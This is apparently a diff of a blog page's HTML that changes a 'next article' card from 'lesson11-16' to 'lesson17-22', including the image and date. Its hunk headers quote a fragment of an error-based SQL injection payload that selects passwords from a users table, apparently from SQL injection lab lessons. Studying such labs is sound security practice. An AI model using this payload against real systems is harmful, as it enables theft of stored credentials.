                 <div class="card-action article-tags">
                     
@@ -819,13 +880,13 @@ uname=admin&#39;) and extractvalue(1,concat(0x7e,(select password from users lim
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/11/24/lesson11-16/">
+                <a href="/2021/11/29/lesson17-22/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="lesson11-16">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="lesson17-22">
                         
-                        <span class="card-title">lesson11-16</span>
+                        <span class="card-title">lesson17-22</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -836,7 +897,7 @@ uname=admin&#39;) and extractvalue(1,concat(0x7e,(select password from users lim
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-29
                             </span>
                         <span class="publish-author">
                             
